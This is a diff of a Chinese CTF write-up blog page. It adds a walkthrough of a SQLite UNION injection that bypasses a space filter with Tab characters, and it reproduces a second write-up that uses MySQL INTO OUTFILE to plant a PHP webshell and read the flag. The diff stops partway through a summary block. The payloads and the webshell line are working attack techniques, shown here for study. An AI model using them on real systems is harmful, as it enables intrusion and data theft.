@@ -3642,6 +3642,179 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-21 23:00:00+00:00">2026-11-21</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../sql%E6%B3%A8%E5%85%A5/" class="md-meta__link">SQL注入</a>, 
+              <a href="./" class="md-meta__link">Web</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="bcactf-2024-michaelsoft-gring-tab"><a class="toclink" href="../../bcactf2024-michaelsoft-gring/">[BCACTF 2024] Michaelsoft Gring — 空格被过滤，就用 Tab</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：SQLite 联合查询注入 — 空格绕过</p>
+<p><strong>Flag</strong>：<code>bcactf{59L_1n1ECTeD_026821}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../bcactf2024-michaelsoft-gring/#_1">题目概述</a></h3>
+<p><strong>题目直接告诉你是 sqlite。</strong>这省掉了一大半判断成本——<strong>不用再去猜 <code>information_schema</code> 还是 <code>sqlite_master</code>。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../bcactf2024-michaelsoft-gring/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="../../bcactf2024-michaelsoft-gring/#step-1">Step 1：确认注入点</a></h4>
+<p><strong>搜索框输入单引号 <code>'</code>，报错。注入点确认。</strong></p>
+<h4 id="step-2"><a class="toclink" href="../../bcactf2024-michaelsoft-gring/#step-2">Step 2：空格被过滤了</a></h4>
+<p><strong>正常 payload 里的空格全被吃掉，SQL 拼不起来。</strong></p>
+<p><strong>常见的替代方案有三种，但这里只有一种能用：</strong></p>
+<table>
+<thead>
+<tr>
+<th>替代写法</th>
+<th>能不能用</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/**/</code>（注释当空格）</td>
+<td>❌</td>
+<td><strong><code>/</code> 在 URL 里会被当成路径分隔符</strong>，服务器直接致命错误</td>
+</tr>
+<tr>
+<td><code>%20</code></td>
+<td>❌</td>
+<td>就是空格本体，一样被过滤</td>
+</tr>
+<tr>
+<td><strong><code>%09</code>（Tab）</strong></td>
+<td>✅</td>
+<td><strong>Tab 在 SQL 里和空格等价，且不在过滤名单里</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>所以后面所有 payload 里的空格都写成 <code>%09</code>。</strong></p>
+<h4 id="step-3"><a class="toclink" href="../../bcactf2024-michaelsoft-gring/#step-3">Step 3：确定列数</a></h4>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="c1">-- </span>
+</span></code></pre></div>
+<p><strong>URL 编码后：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>1'%09UNION%09SELECT%091--
+</span></code></pre></div>
+<p><strong>只有一列。</strong>（多给几列会报错“SELECT 列数不一致”）</p>
+<h4 id="step-4sqlite"><a class="toclink" href="../../bcactf2024-michaelsoft-gring/#step-4sqlite">Step 4：爆表（SQLite 的关键点）</a></h4>
+<p><strong>SQLite 没有 <code>information_schema</code>，表结构存在 <code>sqlite_master</code> 里：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="c1">--</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>1'%09UNION%09SELECT%09group_concat(name)%09FROM%09sqlite_master--
+</span></code></pre></div>
+<p><strong>返回：<code>search,flag</code></strong></p>
+<p><strong>两张表：<code>search</code> 是正常业务表，<code>flag</code> 是目标。</strong></p>
+<h4 id="step-5-flag"><a class="toclink" href="../../bcactf2024-michaelsoft-gring/#step-5-flag">Step 5：拿 flag——两种做法</a></h4>
+<p><strong>① 直接查那一列</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span><span class="c1">--</span>
+</span></code></pre></div>
+<p><strong>② 更省事：查建表语句，一次看到表名+列名</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">sql</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="c1">--</span>
+</span></code></pre></div>
+<p><strong>返回类似：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">flag</span><span class="p">(</span><span class="n">flag</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>看到 <code>flag(flag)</code>，就知道表名和列名都是 <code>flag</code>——一条语句搞定“爆表 + 爆列”。</strong></p>
+<p><strong>最终：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>bcactf{59L_1n1ECTeD_026821}
+</span></code></pre></div>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>数据库</td>
+<td>题目直接说是 sqlite，省掉指纹判断</td>
+</tr>
+<tr>
+<td>注入点</td>
+<td>单引号报错</td>
+</tr>
+<tr>
+<td>空格过滤</td>
+<td>用 <code>%09</code>（Tab）替代；<code>/**/</code> 不行，因为 <code>/</code> 在 URL 里是路径符</td>
+</tr>
+<tr>
+<td>列数</td>
+<td>1 列</td>
+</tr>
+<tr>
+<td>表结构</td>
+<td>SQLite 用 <code>sqlite_master</code>，字段有 <code>type</code>、<code>name</code>、<code>sql</code></td>
+</tr>
+<tr>
+<td>一次的取全</td>
+<td><code>group_concat(sql)</code> 能直接拿到建表语句</td>
+</tr>
+<tr>
+<td>注释</td>
+<td><code>--</code> 后面要跟空格（这里用 <code>--%09</code> 或直接 <code>--</code> 结尾）</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>SQLite 注入速查</summary>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c1">-- 表清单</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s1">'table'</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="c1">-- 建表语句（表名+列名一次看全）</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">sql</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span>
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="c1">-- 拿数据</span>
+</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span>
+</span></code></pre></div>
+<p><strong>SQLite 没有的东西：</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>information_schema    ✗
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>load_file()           ✗
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>INTO OUTFILE          ✗（默认）
+</span></code></pre></div>
+<strong>所以 sqlite 题基本是“把库读干净”，不是 getshell。</strong></p>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 用 <code>/**/</code> 代替空格</strong></p>
+<p><strong>URL 里的 <code>/</code> 会被服务器当路径处理，直接致命错误</strong>，请求还没到 SQL 就挂了。<strong>这种情况下只能用 <code>%09</code> 或 <code>%0a</code>。</strong></p>
+<p><strong>② 想查 <code>information_schema</code></strong></p>
+<p><strong>SQLite 里根本没有这张表。</strong>表结构在 <code>sqlite_master</code>。</p>
+<p><strong>③ 只爆表不爆列</strong></p>
+<p><strong><code>group_concat(sql)</code> 一条就能同时拿到表名和列名</strong>，比先爆表再爆列少两步。</p>
+<p><strong>④ payload 忘记以 <code>1'</code> 开头</strong></p>
+<p><strong>前面的 <code>1'</code> 是用来闭合原查询的引号的</strong>，单写 <code>UNION SELECT</code> 拼进去是语法错误。</p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-21 20:45:00+00:00">2026-11-21</time></li>
         
           <li class="md-meta__item">
@@ -4007,67 +4180,67 @@
 <hr />
 <h3 id="_1"><a class="toclink" href="../../myctf-stellar-archive-sqli/#_1">题目概述</a></h3>
 <p>页面底部有个“终端”入口，进去是一块维护控制台。<strong>提示是日语的，先翻译：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>$ archive --status
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>[ ok ] 名鑑検索サービス: alive
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>[warn] 端末リリース 2.4.1 (legacy ・ 未統合フロント)
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>$ archive --storage
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>[info] エクスポート一時領域: /io/（書き込みは export 機能の実装後）
-</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>[info] 検索サービス本体は名鑑フロントから未接続
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>$ archive --status
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>[ ok ] 名鑑検索サービス: alive
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>[warn] 端末リリース 2.4.1 (legacy ・ 未統合フロント)
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>$ archive --storage
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>[info] エクスポート一時領域: /io/（書き込みは export 機能の実装後）
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>[info] 検索サービス本体は名鑑フロントから未接続
 </span></code></pre></div>
 <p><strong>翻译过来关键的就一行：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>导出临时区域：/io/（写入需在 export 功能实现后）
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>导出临时区域：/io/（写入需在 export 功能实现后）
 </span></code></pre></div>
 <p><strong>这句话等于提前告诉你：</strong><code>/io/</code> 目录可写<strong>。</strong>后面所有操作都是围着这一句展开的。**</p>
 <hr />
 <h3 id="_2"><a class="toclink" href="../../myctf-stellar-archive-sqli/#_2">解题过程</a></h3>
 <h4 id="step-1"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-1">Step 1：找注入点</a></h4>
 <p><strong>页面有个筛选框，输入 <code>rarity &gt;= 3</code> 会返回一段 JSON，里面把拼好的 SQL 也打出来了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>SELECT id, name, title, rarity, element, sig FROM witches WHERE rarity &gt;= 3 ORDER BY id ASC
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>SELECT id, name, title, rarity, element, sig FROM witches WHERE rarity &gt;= 3 ORDER BY id ASC
 </span></code></pre></div>
 <p><strong>输一个单引号（<code>'</code>），报错——注入点确认。</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-2">Step 2：确定列数</a></h4>
 <p><strong>原查询是 6 个字段（id, name, title, rarity, element, sig），所以 UNION 也要 6 列：</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
 </span></code></pre></div>
 <p><strong>能正常返回，说明列数对上了。</strong></p>
 <h4 id="step-3"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-3">Step 3：爆库表列</a></h4>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
 </span></code></pre></div>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">COLUMN_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">'archive_notes'</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">COLUMN_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">'archive_notes'</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><strong><code>-- -</code> 是注释掉后面原来的 <code>ORDER BY id ASC</code>（注意 <code>--</code> 后面必须有一个空格）。</strong></p>
 <p><strong>扫出来的表里，与题目相关的就两张：<code>witches</code>（正常数据）和 <code>archive_notes</code>（看起来像隐藏内容）。</strong></p>
 <h4 id="step-4flag"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-4flag">Step 4：库里的“flag”是假的</a></h4>
 <p><strong>读 <code>archive_notes</code>，看到这么一条：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>封存样本（校验用，非本季名鉴凭证）：MYCTF{d3c0y_4rch1v3_n0t3_d0_n0t_submit}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>封存样本（校验用，非本季名鉴凭证）：MYCTF{d3c0y_4rch1v3_n0t3_d0_n0t_submit}
 </span></code></pre></div>
 <p><strong>注意它自己写着 <code>d3c0y_..._d0_n0t_submit</code>——</strong>这是<strong>诱饵</strong>，交上去就是错的。**</p>
 <p><strong>这题的 flag 不在数据库里。</strong></p>
 <h4 id="step-5"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-5">Step 5：看看能不能写文件</a></h4>
 <p><strong>既然提示说 <code>/io/</code> 可写，先确认数据库的写权限目录：</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><strong>返回：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>/var/www/html/io/
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>/var/www/html/io/
 </span></code></pre></div>
 <p><strong><code>@@secure_file_priv</code> 就是 MySQL/MariaDB 允许 <code>INTO OUTFILE</code> 写入的目录——和终端里那行提示</strong>完全对上<strong>了。</strong></p>
 <p><strong>这说明出题人是故意把这条路留给你。</strong></p>
 <h4 id="step-6-webshell"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-6-webshell">Step 6：写一个 webshell</a></h4>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><strong>几个必须注意的地方：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>① 路径用 @@secure_file_priv 给的那个，不能写别处
-</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>② INTO OUTFILE 不能覆盖已存在的文件（第一次写才成功，重写要换文件名）
-</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>③ 引号要小心：MySQL 写入时会把 " 转义成 \"，
-</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>   一旦变成 $_GET[\"cmd\"] 就是 PHP 语法错误 → 页面 500
-</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>④ 所以用 $_GET[0] 这种不带引号的写法最保险
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>① 路径用 @@secure_file_priv 给的那个，不能写别处
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>② INTO OUTFILE 不能覆盖已存在的文件（第一次写才成功，重写要换文件名）
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>③ 引号要小心：MySQL 写入时会把 " 转义成 \"，
+</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>   一旦变成 $_GET[\"cmd\"] 就是 PHP 语法错误 → 页面 500
+</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>④ 所以用 $_GET[0] 这种不带引号的写法最保险
 </span></code></pre></div>
 <p><strong>访问：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>/io/C.php?0=cat%20/flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>/io/C.php?0=cat%20/flag
 </span></code></pre></div>
 <p><strong>得到：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}
 </span></code></pre></div>
 <hr />
 <table>
@@ -4111,19 +4284,19 @@
 <hr />
 <details class="note">
 <summary>完整流程</summary>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1">-- ① 确认列数</span>
-</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
-</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
-</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="c1">-- ② 爆表</span>
-</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
-</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>
-</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="c1">-- ③ 看写权限目录</span>
